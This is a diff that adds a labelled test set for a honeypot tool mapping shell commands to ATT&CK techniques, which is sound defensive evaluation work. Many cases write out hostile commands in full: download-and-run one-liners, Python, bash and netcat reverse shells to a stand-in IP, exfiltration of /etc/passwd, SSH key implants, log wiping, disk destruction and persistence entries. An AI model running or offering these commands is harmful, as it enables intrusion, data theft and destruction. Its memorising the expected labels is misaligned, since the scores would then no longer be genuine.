@@ -1,0 +1,446 @@
+# Hand-labelled commands for measuring the ATT&CK mapper.
+#
+# Written independently of mapping/rules.toml (whose own examples test that each rule does what
+# its author intended; this file asks whether the mapper agrees with an analyst).
+# Policy: `expect` lists every technique an analyst would assign to the command line as typed.
+# A payload hidden inside a string that is only written to a file (a cron line) counts when
+# running it would clearly be that technique. Commands with nothing to report expect [].
+# These are representative of public honeypot playbooks, not captured from this deployment.
+
+[[case]]
+command = '''cd /tmp; wget http://203.0.113.5/x.sh; chmod +x x.sh; ./x.sh'''
+expect = ["T1105", "T1222.002", "T1059.004"]
+note = "classic dropper"
+
+[[case]]
+command = '''uname -a'''
+expect = ["T1082"]
+
+[[case]]
+command = '''uname -s -v -n -r -m'''
+expect = ["T1082"]
+note = "Mirai-style fingerprint"
+
+[[case]]
+command = '''cat /proc/cpuinfo | grep name | wc -l'''
+expect = ["T1082"]
+note = "miner sizing"
+
+[[case]]
+command = '''free -m | grep Mem | awk '{print $2,$3,$4,$5,$6,$7}''''
+expect = ["T1082"]
+note = "miner sizing"
+
+[[case]]
+command = '''lscpu | grep Model'''
+expect = ["T1082"]
+
+[[case]]
+command = '''lsb_release -a'''
+expect = ["T1082"]
+
+[[case]]
+command = '''ls -lh $(which ls)'''
+expect = ["T1083", "T1518"]
+note = "botnet environment check"
+
+[[case]]
+command = '''ls -la'''
+expect = ["T1083"]
+
+[[case]]
+command = '''crontab -l'''
+expect = ["T1053.003"]
+
+[[case]]
+command = '''w'''
+expect = ["T1033"]
+
+[[case]]
+command = '''id'''
+expect = ["T1033"]
+
+[[case]]
+command = '''whoami'''
+expect = ["T1033"]
+
+[[case]]
+command = '''echo "root:xyz123" | chpasswd | bash'''
+expect = ["T1098", "T1059.004"]
+note = "password reset piped to a shell"
+
+[[case]]
+command = '''cd ~; chattr -ia .ssh; lockr -ia .ssh'''
+expect = ["T1222.002"]
+note = "pre-step of the well-known authorized_keys implant"
+
+[[case]]
+command = '''cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2E attacker" >> .ssh/authorized_keys && chmod -R go= ~/.ssh'''
+expect = ["T1098.004", "T1070.004", "T1222.002"]
+note = "authorized_keys implant"
+
+[[case]]
+command = '''echo 'ssh-rsa AAAAB3NzaC1yc2E attacker' >> ~/.ssh/authorized_keys'''
+expect = ["T1098.004"]
+
+[[case]]
+command = '''curl -s http://203.0.113.5/y.sh | bash'''
+expect = ["T1105", "T1059.004"]
+
+[[case]]
+command = '''wget -qO- http://203.0.113.5/y | sh'''
+expect = ["T1105", "T1059.004"]
+
+[[case]]
+command = '''wget http://203.0.113.5/m.sh -O- | sh'''
+expect = ["T1105", "T1059.004"]
+
+[[case]]
+command = '''busybox wget http://203.0.113.5/a -O /tmp/a'''
+expect = ["T1105"]
+
+[[case]]
+command = '''tftp -g -r a.sh 203.0.113.5'''
+expect = ["T1105"]
+note = "tftp download"
+
+[[case]]
+command = '''ftpget 203.0.113.5 a a'''
+expect = ["T1105"]
+note = "busybox ftpget"
+
+[[case]]
+command = '''/bin/busybox ECCHI'''
+expect = ["T1518"]
+note = "Mirai applet probe"
+
+[[case]]
+command = '''dpkg -l | grep ssh'''
+expect = ["T1518"]
+
+[[case]]
+command = '''ps aux | grep xmrig'''
+expect = ["T1057"]
+
+[[case]]
+command = '''ps -ef'''
+expect = ["T1057"]
+
+[[case]]
+command = '''top -bn1'''
+expect = ["T1057"]
+
+[[case]]
+command = '''nohup ./xmrig -o pool.minexmr.com:4444 -u 4ABCDEF -p x &'''
+expect = ["T1496.001", "T1059.004"]
+
+[[case]]
+command = '''history -c'''
+expect = ["T1070.003"]
+
+[[case]]
+command = '''unset HISTFILE'''
+expect = ["T1690"]
+
+[[case]]
+command = '''export HISTSIZE=0'''
+expect = ["T1690"]
+
+[[case]]
+command = '''rm -f /var/log/auth.log'''
+expect = ["T1685.006", "T1070.004"]
+note = "log wipe"
+
+[[case]]
+command = '''cat /etc/passwd'''
+expect = ["T1087.001"]
+
+[[case]]
+command = '''cat /etc/shadow'''
+expect = ["T1003.008"]
+
+[[case]]
+command = '''ifconfig'''
+expect = ["T1016"]
+
+[[case]]
+command = '''ip a'''
+expect = ["T1016"]
+
+[[case]]
+command = '''cat /etc/resolv.conf'''
+expect = ["T1016"]
+
+[[case]]
+command = '''netstat -antp'''
+expect = ["T1049"]
+
+[[case]]
+command = '''ss -tulpn'''
+expect = ["T1049"]
+
+[[case]]
+command = '''arp -a'''
+expect = ["T1018"]
+
+[[case]]
+command = '''nmap -sS 10.0.0.0/24'''
+expect = ["T1046"]
+
+[[case]]
+command = '''masscan 0.0.0.0/0 -p22 --rate 1000'''
+expect = ["T1046"]
+
+[[case]]
+command = '''ssh root@10.0.0.5'''
+expect = ["T1021.004"]
+
+[[case]]
+command = '''systemctl stop firewalld'''
+expect = ["T1686", "T1489"]
+
+[[case]]
+command = '''iptables -F'''
+expect = ["T1686"]
+
+[[case]]
+command = '''ufw disable'''
+expect = ["T1686"]
+
+[[case]]
+command = '''setenforce 0'''
+expect = ["T1685"]
+note = "disabling SELinux"
+
+[[case]]
+command = '''service auditd stop'''
+expect = ["T1685.004", "T1489"]
+
+[[case]]
+command = '''echo "* * * * * curl http://203.0.113.5/a | sh" >> /etc/crontab'''
+expect = ["T1053.003", "T1105"]
+note = "policy: a download written into a cron entry counts"
+
+[[case]]
+command = '''useradd -m -s /bin/bash support && echo support:Pass1 | chpasswd'''
+expect = ["T1136.001", "T1098"]
+
+[[case]]
+command = '''sudo -l'''
+expect = ["T1548.003"]
+
+[[case]]
+command = '''sudo su'''
+expect = ["T1548.003"]
+
+[[case]]
+command = '''find / -perm -4000 2>/dev/null'''
+expect = ["T1083"]
+note = "SUID hunt"
+
+[[case]]
+command = '''chmod u+s /bin/bash'''
+expect = ["T1548.001"]
+
+[[case]]
+command = '''chmod 777 /tmp/x'''
+expect = ["T1222.002"]
+
+[[case]]
+command = '''tar czf /tmp/a.tgz /etc'''
+expect = ["T1560.001"]
+
+[[case]]
+command = '''zip -r d.zip /home'''
+expect = ["T1560.001"]
+
+[[case]]
+command = '''scp /etc/passwd user@203.0.113.5:/tmp'''
+expect = ["T1048", "T1021.004"]
+
+[[case]]
+command = '''curl -F file=@/etc/passwd http://203.0.113.5/up'''
+expect = ["T1048"]
+
+[[case]]
+command = '''base64 -d /tmp/p | sh'''
+expect = ["T1140", "T1059.004"]
+
+[[case]]
+command = '''echo ZWNobyBoaQ== | base64 -d | bash'''
+expect = ["T1140", "T1059.004"]
+
+[[case]]
+command = '''python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("203.0.113.5",4444));os.dup2(s.fileno(),0);subprocess.call(["/bin/sh","-i"])''''
+expect = ["T1059.006"]
+note = "python reverse shell"
+
+[[case]]
+command = '''bash -i >& /dev/tcp/203.0.113.5/4444 0>&1'''
+expect = ["T1059.004"]
+
+[[case]]
+command = '''nc -e /bin/sh 203.0.113.5 4444'''
+expect = ["T1095", "T1059.004"]
+
+[[case]]
+command = '''rm -rf /*'''
+expect = ["T1485"]
+
+[[case]]
+command = '''dd if=/dev/zero of=/dev/sda'''
+expect = ["T1485"]
+
+[[case]]
+command = '''shutdown -h now'''
+expect = ["T1529"]
+
+[[case]]
+command = '''reboot'''
+expect = ["T1529"]
+
+[[case]]
+command = '''userdel -r bob'''
+expect = ["T1531"]
+
+[[case]]
+command = '''date'''
+expect = ["T1124"]
+
+[[case]]
+command = '''dmesg | grep -i virtual'''
+expect = ["T1497"]
+
+[[case]]
+command = '''systemd-detect-virt'''
+expect = ["T1497"]
+
+[[case]]
+command = '''cat /etc/group'''
+expect = ["T1069.001"]
+
+[[case]]
+command = '''ls /var/log'''
+expect = ["T1654", "T1083"]
+
+[[case]]
+command = '''cat ~/.bash_history'''
+expect = ["T1552.003"]
+
+[[case]]
+command = '''find / -name id_rsa 2>/dev/null'''
+expect = ["T1552.004", "T1083"]
+
+[[case]]
+command = '''cat ~/.aws/credentials'''
+expect = ["T1552.001"]
+
+[[case]]
+command = '''grep -r password /var/www'''
+expect = ["T1552.001"]
+
+[[case]]
+command = '''curl ifconfig.me'''
+expect = ["T1016.001"]
+
+[[case]]
+command = '''curl http://ipinfo.io/ip'''
+expect = ["T1016.001"]
+
+[[case]]
+command = '''systemctl enable evil.service'''
+expect = ["T1543.002"]
+
+[[case]]
+command = '''echo "/tmp/x.so" > /etc/ld.so.preload'''
+expect = ["T1574.006"]
+
+[[case]]
+command = '''echo "/tmp/x &" >> ~/.bashrc'''
+expect = ["T1546.004"]
+
+[[case]]
+command = '''echo "sh /tmp/x" >> /etc/rc.local'''
+expect = ["T1037.004"]
+
+[[case]]
+command = '''ssh -L 8080:127.0.0.1:80 user@203.0.113.5'''
+expect = ["T1572", "T1021.004"]
+
+[[case]]
+command = '''hydra -l root -P pass.txt ssh://203.0.113.5'''
+expect = ["T1110"]
+
+[[case]]
+command = '''touch -r /bin/ls /tmp/x'''
+expect = ["T1070.006"]
+
+[[case]]
+command = '''mkdir /tmp/.hidden'''
+expect = ["T1564.001"]
+
+[[case]]
+command = '''systemctl list-units --type=service'''
+expect = ["T1007"]
+
+[[case]]
+command = '''echo -e "\x7f\x45\x4c\x46\x02\x01\x01\x00\x00\x00" > /tmp/bin'''
+expect = ["T1027"]
+
+[[case]]
+command = '''perl -e 'print 1''''
+expect = ["T1059"]
+
+[[case]]
+command = '''sh /tmp/a.sh'''
+expect = ["T1059.004"]
+
+[[case]]
+command = '''curl -s http://203.0.113.5/a.sh | sh; history -c; rm -f a.sh'''
+expect = ["T1105", "T1059.004", "T1070.003", "T1070.004"]
+note = "download, run, clean up"
+
+[[case]]
+command = '''uname -a; id; cat /etc/passwd'''
+expect = ["T1082", "T1033", "T1087.001"]
+note = "recon one-liner"
+
+[[case]]
+command = '''pwd'''
+expect = []
+note = "benign"
+
+[[case]]
+command = '''cd /tmp'''
+expect = []
+note = "benign"
+
+[[case]]
+command = '''echo hello'''
+expect = []
+note = "benign"
+
+[[case]]
+command = '''clear'''
+expect = []
+note = "benign"
+
+[[case]]
+command = '''exit'''
+expect = []
+note = "benign"
+
+[[case]]
+command = '''true'''
+expect = []
+note = "benign"
+
+[[case]]
+command = '''sleep 5'''
+expect = []
+note = "benign"
+
+[[case]]
+command = '''echo $PATH'''
+expect = []
+note = "benign"
